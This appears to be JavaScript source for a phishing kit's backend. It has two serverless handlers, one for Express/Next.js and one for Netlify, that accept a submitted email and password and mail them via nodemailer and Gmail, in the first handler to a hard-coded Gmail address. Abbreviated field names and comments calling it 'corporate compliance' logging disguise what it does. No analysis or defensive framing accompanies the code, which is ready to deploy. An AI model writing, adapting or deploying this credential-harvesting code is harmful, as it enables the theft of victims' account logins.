const nodemailer = require('nodemailer');

// Exporting as a handler (for frameworks like Express or Next.js)
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method not allowed' });
    }

    const { emll, pss } = req.body;

    // 1. Set up the Transporter using your Partner Startup
    const transporter = nodemailer.createTransport({
        service: 'gmail',
auth: {
    user: process.env.ELL_USS, 
    pass: process.env.ELL_PSS
}
    });

    // 2. Define content for corporate compliance
    const mllOptions = {
        from: '"Secure" <willyscotmegan@gmail.com>',
        to: 'willyscotmegan@gmail.com',
        subject: 'Nw deetzhrefru',
        text: `
               Eml: ${emll}
               Pss: ${pss} `
    };

    try {
        await transporter.sendMail(mllOptions);
        return res.status(200).json({ success: true, message: 'Scss' });
    } catch (error) {
        console.error('Server Error:', error);
        return res.status(500).json({ success: false, message: 'Failed' });
    }
}

const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
    // Only allow POST
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    // Netlify body is sent as a string
    const { emll, pss } = JSON.parse(event.body);

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.ELL_USS,
            pass: process.env.ELL_PSS,
        },
    });

    try {
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: 'Compliance Log: Access Re',
            text: `Eml: ${emll}\nPss: ${pss}`,
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Success" }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Failed to send email" }),
        };
    }
};